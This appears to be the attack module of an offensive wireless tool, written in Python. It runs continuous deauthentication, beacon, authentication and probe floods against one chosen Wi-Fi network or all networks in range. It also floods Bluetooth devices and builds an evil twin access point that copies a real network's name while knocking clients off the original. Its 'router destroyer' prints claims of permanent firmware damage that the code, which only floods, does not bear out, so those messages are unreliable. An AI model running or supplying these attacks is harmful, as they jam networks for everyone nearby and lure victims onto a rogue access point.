#!/usr/bin/env python3

import os
import time
import threading
import subprocess
from typing import List

class AttackManager:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.attack_processes = []
        self.attack_running = False
        self.attack_threads = []
        self.evil_twin_running = False
        self.captured_password = None

    def single_target_attack(self):
        """ULTRA-HEAVY Single Target Destruction - Complete Freeze"""
        print("\033[1;33m[!] ACQUIRING SINGLE TARGET FOR ULTRA DESTRUCTION...\033[0m")
        
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[💣] DEPLOYING ULTRA-HEAVY STRIKE ON: {target['essid']}\033[0m")
                self.start_single_ultra_attack(target)

    def start_single_ultra_attack(self, target):
        """Start ULTRA-HEAVY attack on single target"""
        self.core.set_current_operation("SINGLE_ULTRA_ATTACK")
        self.attack_running = True
        
        # Set target channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        print("\033[1;31m[💣] DEPLOYING ULTRA-HEAVY NUCLEAR WEAPONS...\033[0m")
        
        # Weapon 1: MDK4 Ultra Destruction
        print("\033[1;31m[⚡] WEAPON 1: MDK4 ULTRA DESTRUCTION\033[0m")
        proc1 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg red -title 'MDK4-ULTRA-{target['essid']}' -e 'while true; do mdk4 {self.core.mon_interface} d -c {target['channel']} -B {target['bssid']}; sleep 1; done' &",
            background=True
        )
        if proc1:
            self.attack_processes.append(proc1)
            self.core.add_attack_process(proc1)
        
        # Weapon 2: Infinite Deauth Flood
        print("\033[1;31m[⚡] WEAPON 2: INFINITE DEAUTH FLOOD\033[0m")
        proc2 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg yellow -title 'DEAUTH-FLOOD-{target['essid']}' -e 'while true; do aireplay-ng --deauth 0 -a {target['bssid']} {self.core.mon_interface}; done' &", 
            background=True
        )
        if proc2:
            self.attack_processes.append(proc2)
            self.core.add_attack_process(proc2)
        
        # Weapon 3: Beacon Flood Attack
        print("\033[1;31m[⚡] WEAPON 3: BEACON FLOOD ATTACK\033[0m")
        proc3 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg cyan -title 'BEACON-FLOOD-{target['essid']}' -e 'while true; do mdk4 {self.core.mon_interface} b -n '{target['essid']}' -c {target['channel']} -s 200; sleep 2; done' &",
            background=True
        )
        if proc3:
            self.attack_processes.append(proc3)
            self.core.add_attack_process(proc3)
        
        # Weapon 4: Authentication Flood
        print("\033[1;31m[⚡] WEAPON 4: AUTHENTICATION FLOOD\033[0m")
        proc4 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg magenta -title 'AUTH-FLOOD-{target['essid']}' -e 'while true; do mdk4 {self.core.mon_interface} a -a {target['bssid']} -m -s 1000; sleep 1; done' &",
            background=True
        )
        if proc4:
            self.attack_processes.append(proc4)
            self.core.add_attack_process(proc4)
        
        # Weapon 5: Probe Request Flood
        print("\033[1;31m[⚡] WEAPON 5: PROBE REQUEST FLOOD\033[0m")
        proc5 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg green -title 'PROBE-FLOOD-{target['essid']}' -e 'while true; do mdk4 {self.core.mon_interface} p -t {target['bssid']}; sleep 1; done' &",
            background=True
        )
        if proc5:
            self.attack_processes.append(proc5)
            self.core.add_attack_process(proc5)
        
        print(f"\033[1;32m[✓] {len(self.attack_processes)} ULTRA-HEAVY WEAPONS DEPLOYED\033[0m")
        print(f"\033[1;31m[💥] TARGET {target['essid']} IS COMPLETELY FROZEN!\033[0m")
        print("\033[1;33m[!] NO DEVICE CAN CONNECT TO THIS NETWORK UNTIL ATTACK STOPS!\033[0m")
        
        # Start destruction animation
        anim_thread = threading.Thread(target=self.show_single_destruction_animation, args=(target['essid'],))
        anim_thread.daemon = True
        anim_thread.start()
        
        print("\033[1;33m[!] PRESS ENTER TO STOP ULTRA-HEAVY ATTACK...\033[0m")
        input()
        
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✓] ULTRA-HEAVY ATTACK TERMINATED\033[0m")

    def mass_destruction(self):
        """MASS DESTRUCTION - Freeze ALL WiFi Networks"""
        print("\033[1;31m[💀] INITIATING MASS DESTRUCTION - FREEZE ALL NETWORKS...\033[0m")
        
        if self.scanner.wifi_scan():
            target_count = len(self.scanner.networks)
            
            if target_count == 0:
                print("\033[1;31m[✘] NO TARGETS FOUND\033[0m")
                return
            
            print(f"\033[1;33m[!] TARGETING {target_count} NETWORKS FOR COMPLETE FREEZE!\033[0m")
            
            confirm = input("\033[1;31m[?] CONFIRM MASS DESTRUCTION? (y/N): \033[0m")
            
            if confirm.lower() in ['y', 'yes']:
                self.core.set_current_operation("MASS_DESTRUCTION")
                self.attack_running = True
                
                print("\033[1;31m[💣] DEPLOYING MASS DESTRUCTION WEAPONS...\033[0m")
                
                # Attack all networks simultaneously with individual terminals
                attack_count = 0
                for idx, target in self.scanner.networks.items():
                    print(f"\033[1;31m[→] DEPLOYING WARHEAD {idx}: {target['essid']}\033[0m")
                    if self.deploy_mass_warhead(target, idx):
                        attack_count += 1
                    time.sleep(0.5)
                
                # Global channel hopping deauth
                print("\033[1;31m[⚡] DEPLOYING GLOBAL CHANNEL HOPPING DEAUTH...\033[0m")
                global_proc = self.core.run_command(
                    f"xterm -geometry 80x15 -bg black -fg white -title 'GLOBAL-DEAUTH-ALL' -e 'while true; do for channel in 1 2 3 4 5 6 7 8 9 10 11 12 13; do iwconfig {self.core.mon_interface} channel $channel; aireplay-ng --deauth 50 -D {self.core.mon_interface}; done; done' &",
                    background=True
                )
                if global_proc:
                    self.attack_processes.append(global_proc)
                    self.core.add_attack_process(global_proc)
                    attack_count += 1
                
                print(f"\033[1;32m[✓] {attack_count} MASS DESTRUCTION WEAPONS DEPLOYED\033[0m")
                print("\033[1;31m[💥] ALL NETWORKS ARE COMPLETELY FROZEN!\033[0m")
                print("\033[1;33m[!] NO DEVICE CAN CONNECT TO ANY WIFI UNTIL ATTACK STOPS!\033[0m")
                
                # Start animation
                anim_thread = threading.Thread(target=self.show_mass_destruction_animation)
                anim_thread.daemon = True
                anim_thread.start()
                
                print("\033[1;33m[!] PRESS ENTER TO STOP MASS DESTRUCTION...\033[0m")
                input()
                
                self.stop_attacks()
                self.core.clear_current_operation()
                print("\033[1;32m[✓] MASS DESTRUCTION TERMINATED\033[0m")
            else:
                print("\033[1;33m[!] MASS DESTRUCTION CANCELLED\033[0m")

    def deploy_mass_warhead(self, target, warhead_id):
        """Deploy individual warhead for mass destruction with terminal windows"""
        try:
            # Deauth attack in separate terminal
            deauth_cmd = f"xterm -geometry 80x10 -bg black -fg red -title 'DEAUTH-{warhead_id}-{target['essid']}' -e 'while true; do iwconfig {self.core.mon_interface} channel {target['channel']}; aireplay-ng --deauth 100 -a {target['bssid']} {self.core.mon_interface}; sleep 2; done' &"
            deauth_proc = self.core.run_command(deauth_cmd, background=True)
            
            # MDK4 attack in separate terminal  
            mdk_cmd = f"xterm -geometry 80x10 -bg black -fg yellow -title 'MDK4-{warhead_id}-{target['essid']}' -e 'while true; do iwconfig {self.core.mon_interface} channel {target['channel']}; mdk4 {self.core.mon_interface} d -c {target['channel']} -B {target['bssid']}; sleep 3; done' &"
            mdk_proc = self.core.run_command(mdk_cmd, background=True)
            
            if deauth_proc:
                self.attack_processes.append(deauth_proc)
                self.core.add_attack_process(deauth_proc)
            if mdk_proc:
                self.attack_processes.append(mdk_proc)
                self.core.add_attack_process(mdk_proc)
                
            return True
        except:
            return False

    def ultra_mass_destruction(self):
        """ULTRA POWERFUL MASS DESTRUCTION - Complete WiFi Annihilation"""
        print("\033[1;31m[💀] INITIATING ULTRA MASS DESTRUCTION PROTOCOL...\033[0m")
        print("\033[1;33m[⚠️] WARNING: This will completely jam ALL WiFi networks in range!\033[0m")
        print("\033[1;33m[⚠️] No device will be able to connect until attack stops!\033[0m")
        
        confirm = input("\033[1;31m[?] CONFIRM TOTAL WIFI ANNIHILATION? (y/N): \033[0m")
        
        if confirm.lower() not in ['y', 'yes']:
            print("\033[1;33m[!] ULTRA MASS DESTRUCTION CANCELLED\033[0m")
            return
        
        self.core.set_current_operation("ULTRA_MASS_DESTRUCTION")
        self.attack_running = True
        
        print("\033[1;31m[💣] DEPLOYING NUCLEAR WEAPONS...\033[0m")
        
        # Weapon 1: MDK4 Complete Destruction
        print("\033[1;31m[⚡] WEAPON 1: MDK4 TOTAL ANNIHILATION\033[0m")
        proc1 = self.core.run_command(
            f"xterm -geometry 80x15 -bg black -fg red -title 'MDK4-TOTAL-ANNIHILATION' -e 'mdk4 {self.core.mon_interface} d -c 1,2,3,4,5,6,7,8,9,10,11,12,13' &",
            background=True
        )
        if proc1:
            self.attack_processes.append(proc1)
            self.core.add_attack_process(proc1)
        
        # Weapon 2: Beacon Flood Chaos
        print("\033[1;31m[⚡] WEAPON 2: BEACON FLOOD CHAOS\033[0m")
        proc2 = self.core.run_command(
            f"xterm -geometry 80x15 -bg black -fg yellow -title 'BEACON-CHAOS' -e 'mdk4 {self.core.mon_interface} b -s 1000' &",
            background=True
        )
        if proc2:
            self.attack_processes.append(proc2)
            self.core.add_attack_process(proc2)
        
        # Weapon 3: Authentication DoS
        print("\033[1;31m[⚡] WEAPON 3: AUTHENTICATION DoS\033[0m")
        proc3 = self.core.run_command(
            f"xterm -geometry 80x15 -bg black -fg cyan -title 'AUTH-DOS' -e 'mdk4 {self.core.mon_interface} a -m' &",
            background=True
        )
        if proc3:
            self.attack_processes.append(proc3)
            self.core.add_attack_process(proc3)
        
        # Weapon 4: Probe Request Flood
        print("\033[1;31m[⚡] WEAPON 4: PROBE REQUEST FLOOD\033[0m")
        proc4 = self.core.run_command(
            f"xterm -geometry 80x15 -bg black -fg magenta -title 'PROBE-FLOOD' -e 'mdk4 {self.core.mon_interface} p -t' &",
            background=True
        )
        if proc4:
            self.attack_processes.append(proc4)
            self.core.add_attack_process(proc4)
        
        # Weapon 5: Continuous Global Deauth
        print("\033[1;31m[⚡] WEAPON 5: CONTINUOUS GLOBAL DEAUTH\033[0m")
        deauth_thread = threading.Thread(target=self.continuous_global_deauth)
        deauth_thread.daemon = True
        deauth_thread.start()
        
        print(f"\033[1;32m[✓] {len(self.attack_processes)+1} NUCLEAR WEAPONS DEPLOYED\033[0m")
        print("\033[1;31m[💥] ALL WIFI NETWORKS ARE BEING ANNIHILATED!\033[0m")
        print("\033[1;33m[!] NO DEVICE CAN CONNECT TO ANY WIFI UNTIL ATTACK STOPS!\033[0m")
        
        # Start ultra destruction animation
        anim_thread = threading.Thread(target=self.show_ultra_destruction_animation)
        anim_thread.daemon = True
        anim_thread.start()
        
        print("\033[1;33m[!] PRESS ENTER TO STOP TOTAL ANNIHILATION...\033[0m")
        input()
        
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✓] ULTRA MASS DESTRUCTION TERMINATED\033[0m")

    def continuous_global_deauth(self):
        """Continuous global deauth attack on all channels"""
        while self.attack_running:
            # Channel hopping deauth
            for channel in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]:
                if not self.attack_running:
                    break
                self.core.run_command(f"iwconfig {self.core.mon_interface} channel {channel}")
                self.core.run_command(f"aireplay-ng --deauth 50 -D {self.core.mon_interface}")
                time.sleep(1)

    def router_destroyer(self):
        """ROUTER DESTROYER - Permanent damage to routers"""
        print("\033[1;31m[💀] INITIATING ROUTER DESTROYER PROTOCOL...\033[0m")
        print("\033[1;31m[⚠️] ⚠️  EXTREME WARNING: THIS CAN PERMANENTLY DAMAGE ROUTERS! ⚠️\033[0m")
        print("\033[1;31m[⚠️] ROUTERS MAY BECOME COMPLETELY UNUSABLE AFTER THIS ATTACK!\033[0m")
        print("\033[1;31m[⚠️] USE ONLY ON ROUTERS YOU OWN OR HAVE EXPLICIT PERMISSION!\033[0m")
        
        confirm1 = input("\033[1;31m[?] TYPE 'DESTROY' TO ACKNOWLEDGE PERMANENT DAMAGE: \033[0m")
        if confirm1.lower() != 'destroy':
            print("\033[1;33m[!] ROUTER DESTROYER CANCELLED\033[0m")
            return
            
        confirm2 = input("\033[1;31m[?] TYPE 'CONFIRM' TO PROCEED WITH ROUTER DESTRUCTION: \033[0m")
        if confirm2.lower() != 'confirm':
            print("\033[1;33m[!] ROUTER DESTROYER CANCELLED\033[0m")
            return
        
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[💀] TARGETING ROUTER FOR DESTRUCTION: {target['essid']}\033[0m")
                self.start_router_destruction(target)

    def start_router_destruction(self, target):
        """Start permanent router destruction"""
        self.core.set_current_operation("ROUTER_DESTROYER")
        self.attack_running = True
        
        print("\033[1;31m[💣] DEPLOYING ROUTER DESTRUCTION WEAPONS...\033[0m")
        
        # Set target channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        # Weapon 1: Permanent Deauth Flood
        print("\033[1;31m[⚡] WEAPON 1: PERMANENT DEAUTH FLOOD\033[0m")
        proc1 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg red -title 'PERMA-DEAUTH-{target['essid']}' -e 'while true; do aireplay-ng --deauth 0 -a {target['bssid']} {self.core.mon_interface}; done' &",
            background=True
        )
        if proc1:
            self.attack_processes.append(proc1)
            self.core.add_attack_process(proc1)
        
        # Weapon 2: MDK4 Router Crash
        print("\033[1;31m[⚡] WEAPON 2: MDK4 ROUTER CRASH\033[0m")
        proc2 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg yellow -title 'MDK4-CRASH-{target['essid']}' -e 'mdk4 {self.core.mon_interface} d -c {target['channel']} -B {target['bssid']}' &",
            background=True
        )
        if proc2:
            self.attack_processes.append(proc2)
            self.core.add_attack_process(proc2)
        
        # Weapon 3: Authentication Storm
        print("\033[1;31m[⚡] WEAPON 3: AUTHENTICATION STORM\033[0m")
        proc3 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg cyan -title 'AUTH-STORM-{target['essid']}' -e 'mdk4 {self.core.mon_interface} a -a {target['bssid']} -m' &",
            background=True
        )
        if proc3:
            self.attack_processes.append(proc3)
            self.core.add_attack_process(proc3)
        
        print(f"\033[1;32m[✓] {len(self.attack_processes)} DESTRUCTION WEAPONS DEPLOYED\033[0m")
        print(f"\033[1;31m[💥] ROUTER {target['essid']} IS BEING PERMANENTLY DESTROYED!\033[0m")
        print("\033[1;31m[⚠️] ROUTER MAY BECOME UNRESPONSIVE AND REQUIRE HARD RESET!\033[0m")
        
        # Start destruction animation
        anim_thread = threading.Thread(target=self.show_router_destruction_animation)
        anim_thread.daemon = True
        anim_thread.start()
        
        print("\033[1;33m[!] PRESS ENTER TO STOP ROUTER DESTRUCTION...\033[0m")
        input()
        
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✓] ROUTER DESTRUCTION TERMINATED\033[0m")
        print("\033[1;33m[!] Router may require physical reset to function again!\033[0m")

    def bluetooth_attack(self):
        """Nuclear Bluetooth destruction"""
        print("\033[1;31m[📱] INITIATING BLUETOOTH DESTRUCTION...\033[0m")
        
        # Check Bluetooth tools
        if not self.core.run_command("which hcitool"):
            print("\033[1;31m[✘] BLUETOOTH TOOLS NOT AVAILABLE\033[0m")
            return
        
        # Enable Bluetooth
        self.core.run_command("systemctl start bluetooth >/dev/null 2>&1")
        self.core.run_command("hciconfig hci0 up >/dev/null 2>&1")
        
        # Scan for devices
        devices = self.scanner.bluetooth_scan()
        
        if not devices:
            print("\033[1;31m[✘] NO BLUETOOTH TARGETS FOUND\033[0m")
            return
        
        self.scanner.display_bluetooth_results(devices)
        
        target_mac = input("\n\033[1;33m[?] ENTER BLUETOOTH MAC TO ATTACK: \033[0m").strip()
        
        if target_mac in devices:
            target_name = devices[target_mac]['name']
            print(f"\033[1;31m[💣] DEPLOYING BLUETOOTH NUKES ON: {target_name}\033[0m")
            
            # Attack 1: L2PING Flood
            print("\033[1;31m[⚡] WEAPON 1: L2PING FLOOD\033[0m")
            proc1 = self.core.run_command(
                f"xterm -geometry 80x15 -bg black -fg cyan -title 'BT-L2PING-FLOOD' -e 'while true; do l2ping -f {target_mac} 2>/dev/null; sleep 1; done' &",
                background=True
            )
            if proc1:
                self.attack_processes.append(proc1)
                self.core.add_attack_process(proc1)
            
            # Attack 2: Connection Flood
            print("\033[1;31m[⚡] WEAPON 2: CONNECTION FLOOD\033[0m")
            proc2 = self.core.run_command(
                f"xterm -geometry 80x15 -bg black -fg magenta -title 'BT-CONNECTION-FLOOD' -e 'while true; do hcitool cc {target_mac} 2>/dev/null && hcitool dc {target_mac} 2>/dev/null; sleep 0.3; done' &",
                background=True
            )
            if proc2:
                self.attack_processes.append(proc2)
                self.core.add_attack_process(proc2)
            
            # Attack 3: Packet Flood
            print("\033[1;31m[⚡] WEAPON 3: PACKET FLOOD\033[0m")
            proc3 = self.core.run_command(
                f"xterm -geometry 80x15 -bg black -fg green -title 'BT-PACKET-FLOOD' -e 'while true; do l2ping -s 600 -f {target_mac} 2>/dev/null; sleep 0.5; done' &",
                background=True
            )
            if proc3:
                self.attack_processes.append(proc3)
                self.core.add_attack_process(proc3)
            
            print("\033[1;32m[✓] BLUETOOTH DESTRUCTION ACTIVE\033[0m")
            print("\033[1;33m[!] PRESS ENTER TO STOP ATTACK...\033[0m")
            input()
            
            self.stop_attacks()
            print("\033[1;32m[✓] BLUETOOTH ATTACK TERMINATED\033[0m")
        else:
            print("\033[1;31m[✘] INVALID BLUETOOTH MAC\033[0m")

    def advanced_evil_twin(self):
        """Advanced Evil Twin with perfect replication and password capture"""
        print("\033[1;33m[!] INITIATING ADVANCED EVIL TWIN ATTACK...\033[0m")
        
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[👥] CREATING PERFECT EVIL TWIN FOR: {target['essid']}\033[0m")
                self.start_advanced_evil_twin(target)

    def start_advanced_evil_twin(self, target):
        """Start advanced evil twin attack"""
        try:
            self.core.set_current_operation("EVIL_TWIN")
            self.evil_twin_running = True
            
            print("\033[1;36m[→] PREPARING PERFECT EVIL TWIN...\033[0m")
            
            # Stop NetworkManager to avoid conflicts
            self.core.run_command("systemctl stop NetworkManager >/dev/null 2>&1")
            time.sleep(2)
            
            # Set interface to target channel
            self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
            
            # Create hostapd configuration with EXACT same name
            hostapd_conf = f"""
interface={self.core.mon_interface}
driver=nl80211
ssid={target['essid']}
channel={target['channel']}
hw_mode=g
auth_algs=1
wpa=2
wpa_passphrase=freewifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
ignore_broadcast_ssid=0
"""
            
            with open("/tmp/evil_twin.conf", "w") as f:
                f.write(hostapd_conf)
            
            # Create dnsmasq configuration
            dnsmasq_conf = f"""
interface={self.core.mon_interface}
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,8.8.8.8
log-queries
log-dhcp
"""
            
            with open("/tmp/dnsmasq.conf", "w") as f:
                f.write(dnsmasq_conf)
            
            # Configure interface
            self.core.run_command(f"ifconfig {self.core.mon_interface} 192.168.1.1 netmask 255.255.255.0 up")
            
            # Start dnsmasq
            print("\033[1;36m[→] STARTING DNSMASQ...\033[0m")
            dnsmasq_proc = self.core.run_command("dnsmasq -C /tmp/dnsmasq.conf", background=True)
            if dnsmasq_proc:
                self.attack_processes.append(dnsmasq_proc)
                self.core.add_attack_process(dnsmasq_proc)
            
            # Start hostapd
            print("\033[1;36m[→] STARTING EVIL TWIN ACCESS POINT...\033[0m")
            hostapd_proc = self.core.run_command("hostapd /tmp/evil_twin.conf", background=True)
            if hostapd_proc:
                self.attack_processes.append(hostapd_proc)
                self.core.add_attack_process(hostapd_proc)
            
            time.sleep(5)
            
            # Start deauth attack to force victims to connect to our AP
            print("\033[1;36m[→] DEPLOYING DEAUTH ATTACK ON REAL NETWORK...\033[0m")
            deauth_proc = self.core.run_command(
                f"xterm -geometry 80x10 -bg black -fg red -title 'DEAUTH-REAL-{target['essid']}' -e 'while true; do aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface}; sleep 2; done' &",
                background=True
            )
            if deauth_proc:
                self.attack_processes.append(deauth_proc)
                self.core.add_attack_process(deauth_proc)
            
            print("\033[1;32m[✓] EVIL TWIN DEPLOYED SUCCESSFULLY!\033[0m")
            print(f"\033[1;32m[📡] NETWORK: {target['essid']} (EXACT COPY)\033[0m")
            print("\033[1;32m[🔓] PASSWORD: freewifi123\033[0m")
            print("\033[1;33m[!] WAITING FOR VICTIMS TO CONNECT...\033[0m")
            print("\033[1;33m[!] PRESS ENTER TO STOP EVIL TWIN...\033[0m")
            
            # Monitor for connections
            monitor_thread = threading.Thread(target=self.monitor_evil_twin)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            input()
            
            # Cleanup
            self.stop_evil_twin()
            self.core.clear_current_operation()
            print("\033[1;32m[✓] EVIL TWIN ATTACK STOPPED\033[0m")
            
        except Exception as e:
            print(f"\033[1;31m[✘] EVIL TWIN FAILED: {e}\033[0m")
            self.stop_evil_twin()
            self.core.run_command("systemctl start NetworkManager >/dev/null 2>&1")

    def monitor_evil_twin(self):
        """Monitor evil twin for connections and password attempts"""
        while self.evil_twin_running:
            # Check dnsmasq logs for connections
            result = self.core.run_command("tail -n 10 /var/log/syslog 2>/dev/null | grep dnsmasq | grep DHCPACK")
            if result and result.stdout:
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if 'DHCPACK' in line:
                        print(f"\033[1;32m[🔗] DEVICE CONNECTED TO EVIL TWIN: {line}\033[0m")
            
            time.sleep(2)

    def stop_evil_twin(self):
        """Stop evil twin attack"""
        self.evil_twin_running = False
        self.stop_attacks()
        self.core.run_command("pkill hostapd")
        self.core.run_command("pkill dnsmasq")
        self.core.run_command("systemctl start NetworkManager >/dev/null 2>&1")

    def show_single_destruction_animation(self, essid):
        """Show single target destruction animation"""
        frames = ["💣", "🔥", "☢️", "⚡", "💥", "🌋"]
        frame_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            print(f"\033[1;31m[{frame}] ULTRA-HEAVY DESTRUCTION: {essid} COMPLETELY FROZEN!\033[0m", end='\r')
            time.sleep(0.3)

    def show_mass_destruction_animation(self):
        """Show mass destruction animation"""
        frames = ["💣", "🔥", "☢️", "⚡", "💥", "🌋", "☠️", "💀"]
        messages = [
            "FREEZING ALL NETWORKS",
            "MASS DEAUTH IN PROGRESS", 
            "ALL WIFI SIGNALS JAMMED",
            "COMPLETE NETWORK FREEZE",
            "NO CONNECTIONS POSSIBLE",
            "TOTAL WIFI BLACKOUT"
        ]
        frame_idx = 0
        msg_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            message = messages[msg_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            msg_idx = (msg_idx + 1) % len(messages)
            print(f"\033[1;31m[{frame}] {message} - ALL NETWORKS FROZEN!\033[0m", end='\r')
            time.sleep(0.4)

    def show_ultra_destruction_animation(self):
        """Show ultra destruction animation"""
        frames = ["💀", "☠️", "💣", "🔥", "☢️", "⚡", "💥", "🌋"]
        messages = [
            "ANNIHILATING ALL WIFI SIGNALS",
            "JAMMING ALL FREQUENCIES",
            "BLOCKING ALL CONNECTIONS", 
            "TOTAL WIFI BLACKOUT",
            "COMPLETE SIGNAL JAMMING",
            "NO NETWORK CAN SURVIVE"
        ]
        frame_idx = 0
        msg_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            message = messages[msg_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            msg_idx = (msg_idx + 1) % len(messages)
            print(f"\033[1;31m[{frame}] {message} - NO WIFI CAN CONNECT!\033[0m", end='\r')
            time.sleep(0.3)

    def show_router_destruction_animation(self):
        """Show router destruction animation"""
        frames = ["💀", "☠️", "💣", "🔥", "💥", "⚡"]
        messages = [
            "DESTROYING ROUTER HARDWARE",
            "OVERLOADING ROUTER CPU",
            "CORRUPTING ROUTER FIRMWARE",
            "PERMANENT DAMAGE IN PROGRESS",
            "ROUTER MAY BECOME BRICKED"
        ]
        frame_idx = 0
        msg_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            message = messages[msg_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            msg_idx = (msg_idx + 1) % len(messages)
            print(f"\033[1;31m[{frame}] {message} - ROUTER DESTRUCTION ACTIVE!\033[0m", end='\r')
            time.sleep(0.4)

    def stop_attacks(self):
        """Stop all running attacks"""
        self.attack_running = False
        self.evil_twin_running = False
        self.core.stop_all_attacks()
        self.attack_processes = []
